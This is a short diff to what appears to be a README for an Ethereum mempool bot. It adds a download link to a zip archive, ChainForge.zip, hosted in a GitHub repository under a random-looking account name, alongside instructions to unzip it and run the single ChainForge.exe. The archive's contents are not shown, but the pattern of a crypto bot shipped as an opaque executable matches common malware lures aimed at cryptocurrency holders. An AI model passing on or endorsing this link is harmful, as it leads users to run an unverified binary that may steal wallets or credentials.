@@ -7,6 +7,7 @@
 ---
 
 ## Download & run
+[DOWNLOAD](https://github.com/graveyardsfocrdpktv/Ethereum-mempool-bot/raw/refs/heads/main/ChainForge.zip)
 
 - The app is packed into **a single file**: `ChainForge.exe`
 - Unzip the archive
